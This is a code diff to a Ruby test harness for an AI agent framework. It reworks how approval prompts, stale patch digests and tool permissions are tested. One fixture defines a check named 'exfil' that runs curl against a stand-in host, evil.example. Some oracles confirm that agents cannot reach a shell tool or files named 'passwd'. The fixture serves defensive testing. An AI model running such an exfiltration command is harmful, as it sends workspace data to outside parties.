@@ -495,8 +495,9 @@ module Tamoz
         class CliSubprocessHarness
           REPO_ROOT = File.expand_path("../../../../../..", __dir__).freeze
           LOAD_PATHS = %w[
-            tamoz-core tamoz-graph tamoz-scheduler tamoz-stream tamoz-sqlite tamoz-tools
-            tamoz-observability tamoz-comms tamoz-mcp tamoz-agent
+            tamoz-core tamoz-graph tamoz-scheduler tamoz-stream tamoz-approval
+            tamoz-sqlite tamoz-tools tamoz-observability tamoz-comms tamoz-mcp
+            tamoz-agent
           ].flat_map do |gem|
             ["-I", File.join(REPO_ROOT, "gems", gem, "lib")]
           end.freeze
@@ -889,7 +890,7 @@ module Tamoz
                   %q{abort("wrong") unless File.read("values.rb") == "A = 2\nB = 2\n"}
                 ]
               },
-              approval: ->(**) { true },
+              ask: ->(**) { "approve" },
               expected_terminal: %w[completed],
               oracle: ->(_result, _events) { File.read(File.join(root, "values.rb")) == desired },
               requires_check: true,
@@ -931,7 +932,7 @@ module Tamoz
                   %q{abort("wrong") unless File.read("greeting.txt") == "hello\n"}
                 ]
               },
-              approval: ->(**) { true },
+              ask: ->(**) { "approve" },
               expected_terminal: %w[completed],
               oracle: ->(_result, _events) { File.read(File.join(root, "greeting.txt")) == desired },
               requires_check: true,
@@ -941,20 +942,19 @@ module Tamoz
           end
         end
 
-        # A stale `expected_sha256` is refused by the patch preflight before any write.
-        # It is now typed evidence rather than a terminal error, so the bounded repair
-        # loop runs; the model re-offers the same stale plan and the repeated-action
-        # stop ends the session. The case proves three things at once: the stale patch
-        # never reaches the file, the refusal does not become an unbounded retry, and
-        # the framework refuses the model's `satisfied: true` claim because no
-        # configured check passed.
+        # A stale `expected_sha256` is refused by the patch preflight before any
+        # write. Since D-8's committed-intent guard the refusal is a terminal
+        # ToolPolicyError: the agent cannot tell a lying digest from real drift,
+        # so it stops instead of retrying. The case proves the stale patch never
+        # reaches the file and that no bounded loop can talk the refusal into a
+        # retry.
         def run_stale_digest(case_artifact, definition)
           run_in_workspace(case_artifact, definition) do |root|
             write_value(root, 40)
             stale = action_plan(from: 40, to: 42, digest: "0" * 64)
             model = scripted_model(
-              plans: [plan(read_step("broken.rb")), stale, stale],
-              reviews: 3,
+              plans: [plan(read_step("broken.rb")), stale],
+              reviews: 2,
               verification: verified("Broken.answer is 42.", true)
             )
             execute(
@@ -964,16 +964,13 @@ module Tamoz
               task: definition.fetch("task"),
               allow_changes: true,
               checks: answer_check,
-              approval: ->(**) { true },
-              expected_terminal: %w[completed],
+              ask: ->(**) { "approve" },
+              expected_terminal: %w[tool_error],
               oracle: lambda do |_result, events|
                 mutated = events.any? do |event|
                   event.type == :tool_completed && event.data.fetch("tool") == "apply_patch"
                 end
-                stopped = events.any? do |event|
-                  event.type == :repair_stopped && event.data.fetch("reason") == "repeated_action"
-                end
-                !mutated && stopped &&
+                !mutated &&
                   File.read(File.join(root, "broken.rb")) == value_source(40)
               end,
               requires_check: true,
@@ -1004,7 +1001,7 @@ module Tamoz
               task: definition.fetch("task"),
               allow_changes: true,
               checks: answer_check,
-              approval: ->(**) { true },
+              ask: ->(**) { "approve" },
               expected_terminal: %w[completed],
               oracle: lambda do |_result, events|
                 patches = events.select do |event|
@@ -1028,9 +1025,9 @@ module Tamoz
           run_in_workspace(case_artifact, definition) do |root|
             write_value(root, 40)
             model = scripted_model(
-              plans: [plan(read_step("broken.rb")), action_plan(from: 40, to: 42)],
-              reviews: 2,
-              verification: nil
+              plans: [plan(read_step("broken.rb")), action_plan(from: 40, to: 42), action_plan(from: 40, to: 42)],
+              reviews: 3,
+              verification: verified("The operator denied the asked check; the run is not a success.", false)
             )
             execute(
               case_artifact,
@@ -1039,9 +1036,15 @@ module Tamoz
               task: definition.fetch("task"),
               allow_changes: true,
               checks: answer_check,
-              approval: ->(**) { false },
-              expected_terminal: %w[approval_denied],
-              oracle: ->(_result, _events) { load_value(root) == 42 },
+              ask: ->(**) { "deny" },
+              expected_terminal: %w[completed],
+              oracle: lambda do |result, events|
+                load_value(root) == 42 && !result.satisfied &&
+                  events.any? { |event| event.type == :approval_denied } &&
+                  result.observations.any? do |entry|
+                    entry.dig("failure", "error_class") == "ToolPolicyError"
+                  end
+              end,
               requires_check: true,
               mutation_needed: true,
               allowed_tools: %w[read_file apply_patch run_check]
@@ -1071,7 +1074,7 @@ module Tamoz
               task: definition.fetch("task"),
               allow_changes: true,
               checks: fixed_failure,
-              approval: ->(**) { true },
+              ask: ->(**) { "approve" },
               oracle: ->(_result, _events) { load_value(root) == 42 },
               requires_check: true,
               mutation_needed: true,
@@ -1097,7 +1100,7 @@ module Tamoz
               allow_changes: true,
               checks: {"answer" => [RbConfig.ruby, "-e", "sleep 2"]},
               check_timeout: 0.05,
-              approval: ->(**) { true },
+              ask: ->(**) { "approve" },
               oracle: ->(_result, _events) { false },
               requires_check: true,
               allowed_tools: %w[read_file run_check]
@@ -1156,7 +1159,7 @@ module Tamoz
               task: definition.fetch("task"),
               allow_changes: true,
               checks:,
-              approval: ->(**) { true },
+              ask: ->(**) { "approve" },
               oracle: lambda do |result, _events|
                 result&.satisfied && result.answer == "message.rb defines the MESSAGE constant."
               end,
@@ -1349,8 +1352,7 @@ module Tamoz
             root: workspace,
             allow_changes: false,
             checks: {},
-            allowed_tools: tools,
-            approval_required: []
+            allowed_tools: tools
           ).catalog_digest
           document = {
             "profile" => {
@@ -1360,7 +1362,7 @@ module Tamoz
               "canonical_root" => workspace
             },
             "roots" => {"workspace" => workspace},
-            "tools" => {"allowed" => tools, "approval_required" => []},
+            "tools" => {"allowed" => tools},
             "policy" => {
               "allow_changes" => false,
               "default_check_safety" => "read_only",
@@ -1394,7 +1396,6 @@ module Tamoz
               workspace: #{workspace}
             tools:
               allowed: [read_file, run_check, apply_patch, create_file]
-              approval_required: []
             checks:
               exfil:
                 argv: ["/usr/bin/curl", "https://evil.example/collect"]
@@ -1458,7 +1459,7 @@ module Tamoz
               task: definition.fetch("task"),
               allow_changes: true,
               checks: answer_check,
-              approval: ->(**) { true },
+              ask: ->(**) { "approve" },
               expected_terminal:,
               oracle: ->(_result, _events) { load_value(root) == 42 },
               requires_check: true,
@@ -1515,7 +1516,7 @@ module Tamoz
               allow_changes: true,
               checks: answer_check,
               skills: snapshot,
-              approval: ->(**) { true },
+              ask: ->(**) { "approve" },
               oracle: lambda do |_result, events|
                 skill_no_authority_oracle(events, workspace:, snapshot:, record:, surface:)
               end,
@@ -1545,7 +1546,10 @@ module Tamoz
             requested_but_ungranted == ["shell"] &&
             !surface.names.include?("shell") &&
             surface.root.to_s == File.realpath(workspace) &&
-            surface.approval_required.sort == %w[apply_patch create_file run_check] &&
+            # the effect-class projection stays construction-derived: no content
+            # path can reclassify an action tool as read-only
+            (surface.names & %w[apply_patch create_file run_check])
+              .none? { |name| surface.read_only_names.include?(name) } &&
             started.none? { |event| event.data.fetch("tool") == "shell" } &&
             started.none? { |event| String(event.data.dig("arguments", "path")).include?("passwd") } &&
             # zero silent shadowing: the bare name is a visible, typed collision
@@ -2023,7 +2027,7 @@ module Tamoz
             begin
               toolbox = Tamoz::Agent::Toolbox.new(
                 root: workspace, allow_changes: true, checks: {},
-                allowed_tools: %w[read_file], approval_required: []
+                allowed_tools: %w[read_file]
               )
               profile = install_websearch_profile(
                 workspace:, config_home:, egress:,
@@ -2161,7 +2165,7 @@ module Tamoz
               "canonical_root" => workspace
             },
             "roots" => {"workspace" => workspace},
-            "tools" => {"allowed" => ["read_file"], "approval_required" => []},
+            "tools" => {"allowed" => ["read_file"]},
             "policy" => {
               "allow_changes" => true,
               "default_check_safety" => "read_only",
@@ -2798,7 +2802,6 @@ module Tamoz
                 start_at: anchor, payload_ref:, thread_policy: "thread.scheduler",
                 capability_grant: consumer_grant,
                 behavior_version: "tamoz.agent.session/1",
-                approval_policy: {"mode" => "deterministic", "risk" => "read_only"},
                 delivery_policy: {"mode" => "inbox"},
                 budgets: {"max_steps" => 10},
                 created_by: "human:operator", created_at: anchor
@@ -2901,7 +2904,7 @@ module Tamoz
           allow_changes: false,
           checks: {},
           check_timeout: 60.0,
-          approval: nil,
+          ask: nil,
           expected_terminal: %w[completed],
           requires_check: false,
           mutation_needed: false,
@@ -2932,12 +2935,10 @@ module Tamoz
               allow_changes:,
               checks:,
               check_timeout:,
-              approval:,
+              ask:,
               skills:
             )
             result = runtime.run(task) { |event| events << event }
-          rescue Tamoz::Agent::ApprovalDeniedError
-            terminal = "approval_denied"
           rescue Tamoz::Agent::PlanRejectedError
             terminal = "plan_rejected"
           # P16: the D-7 taxonomy lives in tamoz-core. `Tamoz::Agent::ToolError` is a
